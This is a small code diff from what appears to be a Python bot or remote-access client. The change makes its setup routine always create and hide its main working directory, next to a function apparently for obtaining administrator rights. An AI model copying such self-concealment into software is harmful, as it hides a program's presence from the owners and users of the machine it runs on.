@@ -4856,16 +4856,17 @@ def get_admin():
 
 
 def setup():
+    mkdir(PATH)
+    hide(PATH)
+    
     if not BOT_EXE:
         mkdir([
-            PATH,
             PATH_MEM,
             PATH_SYS, 
             PATH_CONFIG,
             PATH_TMP,
             PATH_SHARE
         ])
-        hide(PATH)
         return
     
     if not os.path.isfile(BOT_FILE_PATH) and os.path.isfile(BOT_FILE_NAME):
